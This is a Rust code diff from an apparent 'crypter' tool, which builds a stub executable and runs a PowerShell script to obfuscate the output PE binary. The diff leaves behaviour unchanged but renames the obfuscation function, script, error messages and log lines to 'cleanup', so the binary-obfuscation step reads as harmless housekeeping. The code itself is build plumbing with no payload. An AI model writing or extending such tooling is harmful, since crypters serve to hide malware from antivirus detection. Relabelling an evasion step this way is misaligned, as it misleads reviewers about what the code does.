@@ -172,12 +172,12 @@ fn build_stub(stub_dir: &Path) -> Result<PathBuf, String> {
     Ok(stub_exe)
 }
 
-fn obfuscate_output(output_exe: &Path, stub_dir: &Path) -> Result<(), String> {
+fn cleanup_output(output_exe: &Path, stub_dir: &Path) -> Result<(), String> {
     let root = stub_dir.parent().and_then(|p| p.parent()).ok_or_else(|| format!("cannot resolve grandparent of: {}", stub_dir.display()))?;
-    let script = root.join("scripts").join("obfuscate_pe.ps1");
+    let script = root.join("scripts").join("cleanup_pe.ps1");
 
     if !script.exists() {
-        return Err(format!("obfuscation script not found: {}", script.display()));
+        return Err(format!("cleanup script not found: {}", script.display()));
     }
 
     if !output_exe.exists() {
@@ -196,13 +196,13 @@ fn obfuscate_output(output_exe: &Path, stub_dir: &Path) -> Result<(), String> {
 
     if !output.status.success() {
         let stderr = String::from_utf8_lossy(&output.stderr);
-        return Err(format!("PE obfuscation failed: {stderr}"));
+        return Err(format!("PE cleanup failed: {stderr}"));
     }
     for line in String::from_utf8_lossy(&output.stdout).lines() {
         pkg::log_info(line);
     }
 
-    pkg::log_info("PE obfuscation applied to output binary.");
+    pkg::log_info("PE cleanup applied to output binary.");
     Ok(())
 }
 
@@ -216,7 +216,7 @@ fn run(crypter: &mut Crypter, stub_dir: &Path) -> Result<(), String> {
 
     std::fs::copy(&built, &crypter.output).map_err(|e| format!("copy output failed: {}", e))?;
     pkg::log_info(&format!("Stub copied to {}", crypter.output.display()));
-    obfuscate_output(&crypter.output, stub_dir)?;
+    cleanup_output(&crypter.output, stub_dir)?;
     crypter.cleanup(stub_dir)?;
     Ok(())
 }
